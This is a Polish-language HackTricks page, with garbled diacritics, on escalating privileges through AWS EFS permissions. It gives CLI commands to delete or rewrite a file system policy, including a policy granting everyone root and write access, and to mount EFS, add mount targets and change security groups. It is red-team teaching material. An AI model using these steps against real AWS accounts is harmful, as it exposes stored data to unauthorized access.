# AWS - EFS Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EFS

Wicej **informacji o EFS** w:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Pamitaj, 偶e aby zamontowa EFS, musisz znajdowa si w podsieci, w kt贸rej EFS jest udostpniony i mie do niego dostp (grupy zabezpiecze). Jeli to si dzieje, domylnie zawsze bdziesz m贸g go zamontowa, jednak jeli jest chroniony przez polityki IAM, musisz mie dodatkowe uprawnienia wymienione tutaj, aby uzyska do niego dostp.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Dziki kt贸remukolwiek z tych uprawnie atakujcy mo偶e **zmieni polityk systemu plik贸w**, aby **da ci dostp** do niego, lub po prostu **usun j**, aby **przyzna domylny dostp**.

Aby usun polityk:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
Aby to zmieni:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Dziki temu uprawnieniu atakujcy bdzie m贸g **zamontowa EFS**. Jeli uprawnienie do zapisu nie jest domylnie przyznawane wszystkim, kt贸rzy mog zamontowa EFS, bdzie mia tylko **dostp do odczytu**.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Dodatkowe uprawnienia `elasticfilesystem:ClientRootAccess` i `elasticfilesystem:ClientWrite` mog by u偶ywane do **zapisu** wewntrz systemu plik贸w po jego zamontowaniu oraz do **dostpu** do tego systemu plik贸w **jako root**.

**Potencjalny wpyw:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w systemie plik贸w.

### `elasticfilesystem:CreateMountTarget`

Jeli atakujcy znajduje si w **podsieci**, w kt贸rej **nie ma punktu montowania** EFS, mo偶e po prostu **utworzy jeden w swojej podsieci** z tym uprawnieniem:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Potencjalny wpyw:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w systemie plik贸w.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

W scenariuszu, w kt贸rym atakujcy odkrywa, 偶e EFS ma punkt monta偶owy w jego podsieci, ale **偶aden z grup zabezpiecze nie zezwala na ruch**, mo偶e po prostu **zmieni to, modyfikujc wybrane grupy zabezpiecze**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Potencjalny wpyw:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w systemie plik贸w.

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
